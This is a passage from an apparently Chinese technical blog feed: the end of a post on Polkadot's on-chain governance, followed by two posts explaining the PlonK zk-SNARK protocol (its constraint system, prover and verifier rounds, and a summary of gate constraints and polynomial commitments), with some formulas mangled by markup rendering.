<p><img src="/2020/11/16/Polkadot%E9%93%BE%E4%B8%8A%E6%B2%BB%E7%90%86%E6%9C%BA%E5%88%B6%E6%B5%85%E6%9E%90/3.png"></p>
<p><strong>提出重要的提案</strong></p>
<p>理事会提出的候选提案，需要获得绝大部分理事会成员的赞成票，并且没有成员投反对票。一个成员只能对一个提案投一次反对票，如果有成员对提案投了反对票，则需要进入冷静期，如果在冷静期之后重再次获得了大多数成员的赞成票，则该提案不可以再被否决。获得理事会成员多数票赞成的提案，将以简单多数制的投票方案进行投票。获得理事会成员全票赞成的提案，采用负投票率偏差的机制进行投票。</p>
<p><strong>取消危险或恶意的提案</strong></p>
<p>超过理事会三分之二成员的同意，可以取消投票。如果取消投票的争议很大，无法获得三分之二多数同意，那么将由全体利益相关者即DOT持有人来决定该提案。</p>
<p><strong>理事会成员选举</strong></p>
<p>Polkadot理事会将有23个席位，每个月进行一次投票选举，所有DOT持有人均可自由注册竞选理事会成员的资格，并可以给自己支持的候选人进行投票，投票权与其所持股份成正比。</p>
<p>这里的投票方式为<a href="http://mp.weixin.qq.com/s?__biz=Mzg2MDA2NzQwNw==&mid=2247483750&idx=1&sn=719ed60f2ecde4ec65f91e9d3e5fccab&chksm=ce2d4246f95acb50758e59bb497c98123d1520b25e3ffefc1bdb5d4b587f2b2f13c2407b8a95&scene=21#wechat_redirect"><strong>NPOS选举验证人的方式</strong></a>一样。</p>
<h3 id="Polkadot治理机制优缺点"><a href="#Polkadot治理机制优缺点" class="headerlink" title="Polkadot治理机制优缺点"></a>Polkadot治理机制优缺点</h3><p>传统的区块链一般采用链下治理的方式，拿以太坊举例，由以太坊基金会在github上收集改进提案，然后由生态参与者进行讨论表达观点，之后由开发团队决定是否采纳提案。如果采纳，将对代码进行更新和升级，最后矿工节点决定是否使用新的代码以支持该提案。</p>
<p>和上面这种链下治理相比，Polkadot的链上治理机制有几个明显的<strong>优点</strong>：</p>
<ol>
<li>Polkadot采用链上存储的WebAssembly代码，使得矿工节点无需重启便可以使用新的提案，从技术上避免了硬分叉。而链下治理的区块链，如果最后部分矿工或者节点运营商不支持提案，则不会使用更新后的代码，这样便出现了硬分叉。</li>
<li>Polkadot采用的链上治理每一个阶段都有明确的时间。而链下治理的时间节点不定，github上可以看到很多以太坊多年前的提案还处于“draft”状态。</li>
<li>每一个DOT持有人都可以参与Polkadot治理，社区治理权在DOT持有人手中。而采用链下治理，最终决定权在于项目的核心开发者，存在中心化问题。</li>
</ol>
<p>Polkadot的治理机制还是存在以下几个<strong>问题</strong>：</p>
<ol>
<li>大部分DOT持有人仅仅只是参与投资，不会参与社区治理，实际参与社区治理的用户数量不多，导致投票率不高。</li>
<li>虽然治理最终决定权不在项目的开发者，但是持有大量DOT的用户可以影响投票结果，也降低了链上治理的去中心化程度。</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Plonk-4-约束与主协议</title>
    <url>/2021/04/14/Plonk-4-%E7%BA%A6%E6%9D%9F%E4%B8%8E%E4%B8%BB%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>论文原文 ==&gt; <a href="https://eprint.iacr.org/2019/953.pdf">953.pdf (iacr.org)</a>，<a href="https://eprint.iacr.org/2019/953.pdf">PlonK: Permutations over Lagrange-bases for Oecumenical Noninteractive arguments of Knowledge</a></p>
<h3 id="6-约束系统Constraint-systems"><a href="#6-约束系统Constraint-systems" class="headerlink" title="6 约束系统Constraint systems"></a>6 约束系统Constraint systems</h3><p>​    给定整数m，n，且n≤m≤2n我们提出一种约束系统，该系统捕获扇入的两个算术电路，这些算术电路具有n个门和m条导线，不受限制地扇出。</p>
<p>​    约束系统 C=(V,Q) 定义如下:</p>
<ul>
<li><p>V的约束是 V=(a,b,c)，其中a,b,c∈[m]，[m]的阶数为n。我们将a，b，c分别视为C的左，右和输出序列。</p>
</li>
<li><p>Q=(qL,qR,qO,qM,qC)∈(<strong><em>F</em></strong>n)，其中(<strong><em>F</em></strong>n)的阶数为5，qL,qR,qO,qM,qC∈**<em>F**</em>n 为选择器向量，每个选择器向量的阶数为n。</p>
</li>
</ul>
<p>x∈*<strong>F***m，i∈[n]，为了满足C，需要满足以下条件：<br>$$<br>(qL)<em>i \cdot X</em>{a_i} + (qR)<em>i \cdot X</em>{b_i} + (qO)<em>i \cdot X</em>{c_i} + (qM)<em>i \cdot (X</em>{a_i}X_{b_i}) + (qC)_i = 0<br>$$<br>​    为了定义基于C的关系，我们将其扩展为包括正整数l≤m和“公共输入”的子集 *</strong>I*<strong>⊂[m]。在不失一般性的前提下，假设**<em>I</em></strong>= {1,…,l}。</p>
<p>​    定义Rc为一组集合对(x,ω)，其中x∈*<strong>F**<em>l，l为阶数，ω∈</em></strong>F***m_l，m-l 为阶数，则 x:=(x,ω)满足C。</p>
<p>​    我们将继续展示此类约束的一些有用实例。</p>
<p><strong>算术电路</strong>：n个门且扇入为2的电路，每个门是加法门或乘法门，约束系统可以如下：</p>
<p>1.m设置为线路数，每根线路与索引i∈[m]相关联。</p>
<p>​    针对每一个i∈[n]，</p>
<p>2.设定<strong>a</strong>i，<strong>b</strong>i，<strong>c</strong>i为第i个门的左、右、输出线路。</p>
<p>3.设定(qL)i=0，(qR)i=0，(qM)i=1，(qO)i=-1，当第i个门是乘法门。</p>
<p>4.设定(qL)i=1，(qR)i=1，(qM)i=0，(qO)i=-1，当第i个门是加法门。（同时可以使用线性组合门，(qL)i，(qR)i为非零整数值）</p>
<p>5.(qC)i=0。</p>
<p><strong>布尔约束</strong>：证明系统中常见的一种情况是需要强制执行 <strong>X</strong>j∈{0,1}，其中j∈[m]，i∈[n]，则：</p>
<p>​        <strong>a</strong>i=<strong>b</strong>i=j，(qL)i=-1，(qM)i=1，(qR)i=(qO)i=(qC)i=0</p>
<p><strong>增强公共输入</strong>：非常方便直接，强制执行公共输入值<strong>X</strong>1,…,<strong>X</strong>l：强制约束<strong>X</strong>j=Xj，i∈[n]，则：</p>
<p>​        <strong>a</strong>i=j，(qL)i=1，(qM)i=(qR)i=(qO)i=0，(qC)i=-xj</p>
<h3 id="7-主协议Main-protocol"><a href="#7-主协议Main-protocol" class="headerlink" title="7 主协议Main protocol"></a>7 主协议Main protocol</h3><p>​    令C=(V,Q)为第6节所述形式的约束系统。我们介绍关系Rc的主要协议。首先，如下定义C的分区（称为Tc）将很方便。</p>
<p>​    令 V=(a,b,c)，认为V是[m]中的一个向量<strong>V</strong>，[m]的阶数为3n。令i∈[m]，Ti⊂[3n]为是索引集j∈[3n]，如Vj=i。现在定义：<br>$$<br>T_c := {T_i}_{i∈[m]}<br>$$<br>​    在介绍本协议之前，我们先做一个最终定义。如果i∈[l]，我们说C为l个公共输入做好了准备。</p>
<p>​        <strong>a</strong>i=i，(qL)i=1，(qM)i=(qR)i=(qO)i=0，(qC)i=0</p>
<p>​    回顾 H∈{g,. . .,gn}，我们提出用于Rc的H范围多项式协议</p>
<p><strong>前处理</strong>：令 <em>σ</em> = <em>σ</em>(Tc)</p>
<p>​    如5.1节所讲，多项式SID1，SID2，SID3，Sσ1，Sσ2，Sσ3∈ <strong><em>F</em></strong> &lt;n[<strong>X</strong>]。</p>
<p>​    多项式qL，qR，qO，qM，qC ∈ <strong><em>F</em></strong> &lt;n[<strong>X</strong>]，针对每一个i∈[n]均满足：<br>$$<br>q_L(g^i):=(q_L)_i,q_R(g^i):=(q_R)_i,q_O(g^i):=(q_O)_i,q_M(g^i):=(q_M)_i,q_C(g^i):=(q_C)_i<br>$$<br><strong>协议</strong>：</p>
<p>1.<strong>X</strong>∈ <strong><em>F</em></strong>，*<strong>F*<strong>的阶数为m，令</strong>X<strong>为</strong>P<strong>poly的公共输入X。</strong>P**poly计算3个多项式fL，fR，fO∈ *</strong>F*** &lt;n[<strong>X</strong>]，i∈[n]，<br>$$<br>f_L(i)=X_{a_i},f_R(i)=X_{b_i},f_O(i)=X_{c_i}<br>$$<br><strong>P</strong>poly发送fL，fR，fO给到第三方 <strong><em>I</em></strong>。</p>
<p>2.<strong>P</strong>poly和<strong>V</strong>poly使用5.1节所讲到的排列协议，使用排列σ，σ介于(fL, fR, fO)与自身之间。如5.2阶所讲，将确切地检查(fL, fR, fO)是否满足Tc。</p>
<p>3.<strong>V</strong>poly计算公共输入多项式：<br>$$<br>PI(X):= \sum _{i∈[l]}-x_i \cdot L_i(X)<br>$$<br>4.<strong>V</strong>poly在H范围内检验恒等式：<br>$$<br>q_L \cdot f_L + q_R \cdot f_R + q_O \cdot f_O + q_M \cdot f_L \cdot f_R + (q_C + PI) = 0<br>$$</p>
<h3 id="8-最终协议"><a href="#8-最终协议" class="headerlink" title="8.最终协议"></a>8.最终协议</h3><h4 id="8-1-多项式定义一个专用电路"><a href="#8-1-多项式定义一个专用电路" class="headerlink" title="8.1 多项式定义一个专用电路"></a>8.1 多项式定义一个专用电路</h4><p>以下多项式，唯一性地定义一个通用的SNARK电路：</p>
<ul>
<li><p>qM(X)，qL(X)，qR(X)，qO(X)，qC(X)，定义电路算术化的“选择器”多项式</p>
</li>
<li><p>SID1(X)=X，SID2(X)=k1X，SID3(X)=k2X：应用于a, b, c的恒等式排列。选择k1，k2∈*<strong>F*** ，使得H，k1·H，k2·H是*</strong>F****中H的不同的协集，因此由3n个不同的元素组成。例如，ω是二次残基的，k1为任何二次非残基，而k2为不包含在k1·H中的二次非残基。</p>
</li>
<li><p>Sσ1(X)，Sσ2(X)，Sσ3(X)：复制排列应用于a，b，c</p>
</li>
<li><p>n为给定电路总的门数。V使用它来计算消失的多项式：<br>$$<br>Z_H(X)=X^n-1<br>$$</p>
</li>
</ul>
<h4 id="8-2-对线路价值的承诺Commitments-to-wire-values"><a href="#8-2-对线路价值的承诺Commitments-to-wire-values" class="headerlink" title="8.2 对线路价值的承诺Commitments to wire values"></a>8.2 对线路价值的承诺Commitments to wire values</h4><p>对于以下协议，我们描述了包含n个算术门的通用SNARK电路的证明关系。证据proof的见证人witnesses是线路价值的见证。承诺commitments [a]1，[b]1，[c]1将Kate多项式承诺通过计算方式绑定到线路价值。</p>
<h4 id="8-3-展开的通用的SNARK证明关系"><a href="#8-3-展开的通用的SNARK证明关系" class="headerlink" title="8.3 展开的通用的SNARK证明关系"></a>8.3 展开的通用的SNARK证明关系</h4><p>$$<br>Rsnark(λ)=\begin{Bmatrix} (x,w,crs) = ((w_i)<em>{i \in [l]}),((w_i) ^{3n} _{i=1,i \in [l]}),((q</em>{M_i},q_{L_i},q_{R_i},q_{O_i},q_{C_i}) ^n _{i=1}, n, σ(x))\<br>\text {For all } i \in {1,…,3n }:w_i \in F_p, </p>
<p>\ \text {and for all } i \in {1,…,n}:w_iw_{n+i}q_{M_i} + w_iq_{L_i} + w_{n+i}q_{R_i} + w_{2n+i}q_{O_i} + q_{C_i} = 0<br>\ \text { and for all } i \in {1,…,3n}:w_i=w_{σ(i)}<br>\end{Bmatrix}<br>$$</p>
<h4 id="8-4-协议"><a href="#8-4-协议" class="headerlink" title="8.4 协议"></a>8.4 协议</h4><p>​    我们将下面的协议描述为使用Fiat-Shamir启发式技术的非交互式协议。为此，我们总是通过笔录表示共同的预处理输入，公共输入以及证明者在特定时间点之前编写的证明元素的串联。使用<strong>transcript</strong>通过(Fiat-Shamir)获得随机挑战。或者，可以通过发送随机字段元素的验证程序替换我们在“compute challenges”下写下的所有要点，以获得交互式协议，从中可以得出非交互式协议。使用R来指代哈希函数R:{0,1}→**<em>F**</em>p来模拟随机预言。</p>
<p><strong>共同的预处理输入：</strong><br>$$<br>\begin{matrix}<br>n,(x \cdot [1]<em>1,…,x^{n+5} \cdot [1]<em>1),(q</em>{M_i},q_{L_i},q_{R_i},q_{O_i},q_{C_i}) ^n _{i=1} ,  σ(X), \<br>q_M(X)=\sum ^n _{i=1} q</em>{M_i}L_i(X),\<br>q_L(X)=\sum ^n <em>{i=1} q</em>{L_i}L_i(X),\<br>q_R(X)=\sum ^n <em>{i=1} q</em>{R_i}L_i(X),\<br>q_O(X)=\sum ^n <em>{i=1} q</em>{O_i}L_i(X),\<br>q_C(X)=\sum ^n <em>{i=1} q</em>{C_i}L_i(X),\</p>
<p>S_{σ1}(X)=\sum ^n <em>{i=1} σ(i)L_i(X),\<br>S_{σ2}(X)=\sum ^n _{i=1} σ(n+i)L_i(X),\<br>S</em>{σ3}(X)=\sum ^n <em>{i=1} σ(2n+i)L_i(X),\<br>\end{matrix}<br>$$<br><strong>公共输入：</strong><br>$$<br>l,(w_i)</em>{i \in [l]}<br>$$</p>
<h4 id="证明人算法："><a href="#证明人算法：" class="headerlink" title="证明人算法："></a>证明人算法：</h4><p><strong>证明人输入：</strong><br>$$<br>(w_i)_{i \in [3n]}<br>$$<br><strong>Round 1:</strong></p>
<p>​    生成随机的盲标量(b1,…,b9)∈ <strong><em>F</em></strong>p</p>
<p>​    计算线路多项式 a(X)，b(X)，c(X):<br>$$<br>\begin{matrix}<br>a(X)=(b_1X+b_2)Z_H(X)+\sum <em>{i=1} ^n w_iL_i(X)    \<br>b(X)=(b_3X+b_4)Z_H(X)+\sum _{i=1} ^n w</em>{n+i}L_i(X)    \<br>c(X)=(b_5X+b_6)Z_H(X)+\sum <em>{i=1} ^n w</em>{2n+i}L_i(X)    \<br>\end{matrix}<br>$$<br>​    计算<br>$$<br>[a]_1 := [ \alpha (x)]_1,[b]_1 := [b(x)]_1,[c]_1 := [c(x)]_1<br>$$<br>​    第一个输出 <strong><em>P</em></strong> 为：<br>$$<br>[a]_1 ,[b]_1 ,[c]_1<br>$$<br><strong>Round 2:</strong></p>
<p>​    计算排列挑战(β, γ)∈ <strong><em>F</em></strong>p: β = R(transcript,0), γ = R(transcript,1)</p>
<p>​    计算排列多项式 z(X):<br>$$<br>\begin{matrix}<br>z(X)=<br>(b_7X^2+b_8X+b_9)Z_H(X)+    \<br>L_1(X)+    \<br>\sum <em>{i=1} ^{n-1}\left(L</em>{i+1}(X) \prod ^i <em>{j=1} \frac{(w_j+\beta w^{j-1}+\gamma)(w_{n+j}+\beta k_1w^{j-1}+\gamma)(w_{2n+j}+\beta k_2w^{j-1}+\gamma)}{(w_j+\sigma(j)\beta+\gamma))(w</em>{n+j}+\sigma(n+j)\beta+\gamma)(w_{2n+j}+\sigma(2n+j)\beta+\gamma)}\right)<br>\end{matrix}<br>$$<br>​    计算:<br>$$<br>[z]_1:=[z(x)]_1<br>$$<br>​    第二个输出 <strong><em>P</em></strong> 为：<br>$$<br>([z]_1)<br>$$<br><strong>Round 3:</strong></p>
<p>​    计算商数挑战α∈ <strong><em>F</em></strong>p：<em>α</em> = <em>R</em>(transcript)</p>
<p>​    计算商数二项式t(X)：<br>$$<br>\begin{matrix}<br>t(X)=(a(X)b(X)q_M(X)+a(X)q_L(X)+b(X)q_R(X)+c(X)q_O(X)+PI(X)+q_C(X)) \frac{1}{Z_H(X)} \+ ((a(X)+\beta X+\gamma)(b(X)+\beta k_1X+\gamma)(c(X)+\beta k_2X+\gamma)z(X)) \frac{\alpha}{Z_H(X)}<br>\- ((a(X)+\beta S_{\sigma 1} (X)+\gamma)(b(X)+\beta S_{\sigma 2} (X)+\gamma)(c(X)+\beta S_{\sigma 3} (X)+\gamma)z(X\omega))\frac{\alpha}{Z_H(X)}<br>\+ ((z(X)-1)L_1(X)\frac{\alpha ^2}{Z_H(X)}<br>\end{matrix}<br>$$<br>​    拆分 t(X) 为多项式 tlo(X)，tmid(X)和thi(X)， tlo(X)阶数&lt;n，thi(X)阶数≤n+5，即<br>$$<br>t(X)=t_{lo}(X)+X^nt_{mind}(X)+X^{2n}t_{hi}(X)<br>$$<br>​    计算<br>$$<br>[t_{lo}]<em>1:=[t</em>{lo}(x)]<em>1, [t</em>{mid}]_1:=[tmid(x)]<em>1, [t</em>{hi}]<em>1:=[t</em>{hi}(x)]<em>1<br>$$<br>​    第三个输出 <strong><em>P</em></strong> 为：<br>$$<br>([t</em>{lo}]<em>1,[t</em>{mid}]<em>1,[t</em>{hi}]_1)<br>$$<br><strong>Round 4:</strong></p>
<p>​    计算评估挑战ζ∈ <strong><em>F</em></strong>p：ζ= <em>R</em>(transcript)</p>
<p>​    计算开放评估：<br>$$<br>\overline a=a(ζ),\overline b=b(ζ), \overline c=c(ζ),\overline S_{\sigma 1}=S_{\sigma 1}(ζ), \overline S_{\sigma 2}=S_{\sigma 2}(ζ), \overline t=t(ζ), \overline z=z(ζω)<br>$$<br>​    计算线性化多项式 r(X)：<br>$$<br>\begin{matrix}<br>r(X)=(\overline a \overline b \cdot q_M(X)+\overline a \cdot q_L(X)+\overline b \cdot q_R(X)+ \overline c \cdot q_O(X)+q_C(X)) \</p>
<ul>
<li>((\overline a+\beta ζ+\gamma)(\overline b+\beta k_1ζ+\gamma)(\overline c+\beta k_2ζ+\gamma)\cdot z(X))\alpha<br>\- ((\overline a+\beta \overline S_{\sigma 1}+\gamma)(\overline b+\beta S_{\sigma 2}+\gamma)\beta \overline z_ω \cdot S_{\sigma 3}(X)) \alpha<br>\+ ((z(X))L_1(ζ){\alpha ^2}<br>\end{matrix}<br>$$<br>​    计算线性化评估<br>$$<br>\overline r = r(ζ)<br>$$<br>​    第四个输出 <strong><em>P</em></strong> 为：<br>$$<br>(\overline a, \overline b, \overline c, \overline S_{\sigma 1},\overline S_{\sigma 2},\overline z_ω,\overline t,\overline r)<br>$$</li>
</ul>
<p><strong>Round 5:</strong></p>
<p>​    计算开放挑战 υ∈ <strong><em>F</em></strong>p：υ= <em>R</em>(transcript)</p>
<p>​    计算开放证明多项式 Wζ(X)：<br>$$<br>W_ζ(X)=\frac{1}{X-ζ}\left(<br>\begin{matrix}<br>(t_{lo}(X)+ζ^nt_{mid}(X)+ζ^{2n}t_{hi}(X)-\overline t)\<br>+υ(r(X)-\overline r)\<br>+υ^2(a(X)-\overline a)\<br>+υ^3(b(X)-\overline b)\<br>+υ^4(c(X)-\overline c)\<br>+υ^5(S_{\sigma 1}(X)-\overline S_{\sigma 1})\<br>+υ^6(S_{\sigma 2}(X)-\overline S_{\sigma 2})\</p>
<p>\end{matrix}<br>\right)<br>$$<br>​    计算开放证明多项式：<br>$$<br>W_{ζω}(X)=\frac{(z(X)-\overline z_ω)}{X-ζω}<br>$$<br>​    计算：<br>$$<br>[W_ζ]<em>1:=[W_ζ(x)]_1,[W_ζω]_1:=[W_ζω(x)]_1<br>$$<br>​    第五个输出P为<br>$$<br>([W_ζ]_1,[W_ζω]_1)<br>$$<br>​    返回<br>$$<br>π</em>{SNARK}=\left(<br>[a]<em>1,[b]<em>1,[c]_1,[z]_1,[t</em>{lo}]<em>1,[t</em>{mid}]<em>1,[t</em>{hi}]<em>1,[W_ζ]_1,[W_ζω]_1,\overline a, \overline b, \overline c, \overline S</em>{\sigma 1},\overline S</em>{\sigma 2},\overline r, \overline z_ω<br>\right)<br>$$<br>​    计算多点评估挑战 u∈ <strong><em>F</em></strong>p：u = R(transcript)</p>
<p>​    现在，我们以最小化<strong>G1</strong>标量乘法次数的方式描述验证程序算法。</p>
<h4 id="验证人算法："><a href="#验证人算法：" class="headerlink" title="验证人算法："></a>验证人算法：</h4><p><strong>验证预处理输入：</strong><br>$$<br>\begin{matrix}<br>[q_M]<em>1:=q_M(x)\cdot [1]_1\,<br>[q_L]_1:=q_L(x)\cdot [1]_1\<br>,[q_R]_1:=q_R(x)\cdot [1]_1\<br>,[q_O]_1:=q_O(x)\cdot [1]_1\<br>,[S</em>{\sigma 1}]<em>1:=S</em>{\sigma 1}(x)\cdot [1]<em>1\<br>,[S</em>{\sigma 2}]<em>1:=S</em>{\sigma 2}(x)\cdot [1]<em>1\<br>,[S</em>{\sigma 3}]<em>1:=S</em>{\sigma 3}(x)\cdot [1]_1\<br>x \cdot [1]_2<br>\end{matrix}<br>$$</p>
<p>$$<br>\begin{matrix}<br>1.验证 \left(<br>[a]<em>1,[b]<em>1,[c]_1,[z]_1,[t</em>{lo}]<em>1,[t</em>{mid}]<em>1,[t</em>{hi}]_1,[W_ζ]_1,[W_ζω]_1<br>\right) \in G_1 \<br>2.验证\left(<br>\overline a, \overline b, \overline c, \overline S</em>{\sigma 1},\overline S_{\sigma 2},\overline r, \overline z_ω<br>\right) \in F ^7 <em>p \<br>3.验证 (w_i)_{i \in [l]} \in F ^l _p \<br>4.计算 \beta,\gamma,\alpha,ζ,v, u \in F_p 如证明人算法描述 \<br>5.计算零多项式评估 Z_H(ζ)=ζ^n-1 \<br>6.计算拉格朗日多项式评估 L_1(ζ)=\frac{ζ^n-1}{n(ζ-1)} \<br>7.计算公共多项式评估 PI(ζ)=\sum</em>{i\in l} w_iL_i(ζ) \<br>8.计算求商多项式评估 \overline t = \frac{\overline r + PI(ζ) - ((\overline a+\beta \overline S_{\sigma 1}+\gamma)(\overline b+\beta \overline S_{\sigma 2}+\gamma)(\overline c+\gamma) \overline z_ω)\alpha - L_1(ζ)\alpha ^2)}{Z_H(ζ)}<br>\end{matrix}<br>$$</p>
<p>9.计算第一部分的批多项式承诺<br>10.计算整体批多项式承诺<br>11.计算群编码批评估<br>12.验证全部评估</p>
]]></content>
      <tags>
        <tag>零知识证明</tag>
      </tags>
  </entry>
  <entry>
    <title>Plonk-5-本人对Plonk的理解和总结</title>
    <url>/2021/04/15/Plonk-5-%E6%9C%AC%E4%BA%BA%E5%AF%B9Plonk%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8C%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>论文原文 ==&gt; <a href="https://eprint.iacr.org/2019/953.pdf">953.pdf (iacr.org)</a>，<a href="https://eprint.iacr.org/2019/953.pdf">PlonK: Permutations over Lagrange-bases for Oecumenical Noninteractive arguments of Knowledge</a></p>
<h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>利用可更新的通用结构化参考字符串的zk-SNARK构造消除了部署zk-SNARKs [GKM +]的主要障碍之一。 Maller等人的重要工作，[MBKM19]提出了Sonic-第一个具有实用性的zk-SNARK，具有完全简洁的验证，可用于带有这种SRS(structured reference string)的通用算术电路。但是，<a href="https://eprint.iacr.org/2019/601.pdf">支持完全简洁验证的Sonic版本</a>仍然需要相对较高的证明建造费用。 我们提出了一种具有完全简洁验证的通用SNARK结构，并且大大减少了证明方的运行时间（根据电路结构的不同，证明者的运行时间比完全简洁验证程序模式下的[MBKM19]少7.5-20倍）。与[MBKM19]类似，我们依赖于基于Bayer和Groth [BG12]的置换参数。但是，我们专注于“评估亚组而不是单项式系数”； 这样可以简化置换参数和算术化步骤。</p>
<p>=================以下为本人对 Plonk 的理解和总结=================</p>
<p>PlonK（以及更早但更复杂的<a href="https://www.benthamsgaze.org/2019/02/07/introducing-sonic-a-practical-zk-snark-with-a-nearly-trustless-setup/">SONIC</a>、以及最近的<a href="https://eprint.iacr.org/2019/1047.pdf">Marlin</a>）带来的是一系列的改进，这些改进可能会总体上大大提高这类证明的可用性及进展。</p>
<p><strong>第一个改进</strong>：虽然PlonK仍需要一个类似Zcash SNARKs的可信设置过程，但它是一个“通用且可更新”的可信设置。这意味着两件事：首先，不需要为每一个你想证明的程序都设置一个单独的可信设置，而是为整个方案设置一个单独的可信设置，之后你可以将该方案与任何程序一起使用（在进行设置时可选择最大大小）。第二，有一种方法可以让多方参与可信设置，这样只要其中任何一方是诚实的，那这个可信设置就是安全的，而且这种多方过程是完全连续的：首先是第一个人参与，然后是第二个人，然后是第三个……参与者们甚至不需要提前知道，新的参与者可以把自己添加到最后。这使得可信设置很容易拥有大量参与者，从而在实践中确保设置是非常安全的。</p>
<p><strong>第二个改进</strong>：它所依赖的“奇特密码学”是一个单一的标准化组件，称为“polynomial commitment”（多项式承诺）。PLONK使用基于可信设置和椭圆曲线对的“Kate commitments”（Kate承诺），但也可以用其它方案替换它，例如<a href="https://vitalik.ca/general/2017/11/22/starks_part_2.html">FRI</a>（这将使<a href="https://eprint.iacr.org/2019/1020">PLONK变成一种STARK</a>）或者DARK（基于隐藏顺序组）。这意味着该方案在理论上与证明大小和安全性假设之间的任何（可实现的）权衡兼容。</p>
<p>下图为Vitalik对PlonK的定位：</p>
<p><img src="/2021/04/15/Plonk-5-%E6%9C%AC%E4%BA%BA%E5%AF%B9Plonk%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8C%E6%80%BB%E7%BB%93/4.png"></p>
<p>​    这意味着需要在证明大小与安全性假设之间进行不同权衡的用例，仍然可以为“算术化”共享大部分相同的工具(把一个程序转换成一组多项式方程的过程，然后用多项式承诺来检验)。如果这种方案被广泛采用，那我们可期待在改进共享算术化技术方面的快速进展。</p>
<h3 id="PlonK的工作原理"><a href="#PlonK的工作原理" class="headerlink" title="PlonK的工作原理"></a>PlonK的工作原理</h3><p>​    PLONK的一个关键组成部分，就像<a href="https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649">SNARKs中使用的QAP</a>一样，这是一个转换问题的过程，形式是“给我一个值X，我给你一个特定的程序P，这样当X作为输入进行计算时，给出一些具体的结果Y”，放到问题中：“给我一组满足一组数学方程的值“。程序P可以表示很多东西，例如，问题可能是“给我一个数独的解决方案”，你可以通过将P设置为数独验证器加上一些编码的初始值并将Y设置为1（即“是的，这个解决方案是正确的”）来对其进行编码，一个令人满意的输入X将是数独的有效解决方案。这是通过将P表示为一个带有逻辑门的加法和乘法电路，并将其转换为一个方程组来完成的，其中变量是所有线上的值，每个门有一个方程（例如，乘法为<code>x6 = x4 * x7</code>，加法为<code>x8 = x5 + x9</code>）。</p>
<p>​    下面是一个求<code>x</code>问题的例子，这样<code>P(x) = x**3 + x + 5 = 35</code> (提示:<code> x = 3</code>):</p>
<p><img src="/2021/04/15/Plonk-5-%E6%9C%AC%E4%BA%BA%E5%AF%B9Plonk%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8C%E6%80%BB%E7%BB%93/5.png"></p>
<p>我们按如下方式给门和线贴上标签：</p>
<p><img src="/2021/04/15/Plonk-5-%E6%9C%AC%E4%BA%BA%E5%AF%B9Plonk%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8C%E6%80%BB%E7%BB%93/6.png"></p>
<p>​    门和线上，我们有两种类型的约束：<strong>门约束</strong>（连接到相同门之间线的方程，例如<code>a1 * b1 = c1</code>）和复制约束（关于电路中任何位置的不同线相等的声明，例如<code>a0 = a1 = b1 = b2 = a3 </code>或者<code>c0 = a1</code>）。我们需要创建一个结构化的方程组，它最终将减少到一个非常少数量的多项式方程组，来表示这两个方程组。</p>
<p>在PlonK中，这些方程的设置和形式如下（其中，L = 左，R=右，O=输出，M=乘法，C=常数）：<br>$$<br>({Q_L}_i)a_i + ({Q_R}_i)b_i + ({Q_O}_i)c_i + ({Q_M}_i)a_ib_i + {Q_C}_i = 0<br>$$<br>​    每个<code>Q</code>值都是一个常数，每个方程中的常数（和方程数）对于每个程序都是不同的。每个小写字母值都是一个变量，由用户提供：ai 是第i个门的左输入线，bi是右输入线，ci是第i个门的输出线。</p>
<p>​    对于加法门，我们设置：<br>$$<br>{Q_L}_i=1, {Q_R}_i=1, {Q_O}_i=-1, {Q_M}_i=0, {Q_C}_i=0<br>$$<br>​    将这些常数插入方程并进行简化，得到<code>ai+bi-oi=0</code>，这正是我们想要的约束条件。</p>
<p>​    对于乘法门，我们设置：</p>
<p>$$<br>{Q_L}_i=0, {Q_R}_i=0, {Q_O}_i=-1, {Q_M}_i=1, {Q_C}_i=0<br>$$<br>​    对于将ai设置为某个常数<code>x</code>的常数门，我们设置：<br>$$<br>Q_L=1, Q_R=0, Q_O=1, Q_M=0, Q_C=-x<br>$$<br>​    你可能已注意到线的每一端，以及一组线中的每根线，显然必须具有相同的值（例如x）对应于一个不同的变量；到目前为止，没有什么能强迫一个门的输出与另一个门的输入相同（我们称之为“复制约束”）。Plonk有一种强制复制约束的方法。所以现在我们有一个问题，证明者想要证明他们有一堆Xai, Xbi以及Xci值满足了一堆相同形式的方程。这仍然是一个大问题，但不像“找到这个计算机程序的一个令人满意的输入”，这是一个非常结构化的大问题，我们有数学工具可用于“压缩”它。</p>
<h4 id="从线性系统到多项式"><a href="#从线性系统到多项式" class="headerlink" title="从线性系统到多项式"></a>从线性系统到多项式</h4><p>​    这里的主要内容是将多项式理解为一种数学工具，用于将大量值封装到单个对象中。通常，我们是以“系数形式”来看待多项式，即如下表达式：<br>$$<br>y = x^3 - 5x^2 + 7x -2<br>$$<br>​    但我们也可用“定值形式”来看待多项式。例如，我们可以认为上面是在坐标<code>（0，1，2，3）</code>处分别定值<code>（-2，1，0，1）</code>的“阶数&lt;4的多项式：</p>
<p><img src="/2021/04/15/Plonk-5-%E6%9C%AC%E4%BA%BA%E5%AF%B9Plonk%E7%9A%84%E7%90%86%E8%A7%A3%E5%92%8C%E6%80%BB%E7%BB%93/7.png"></p>
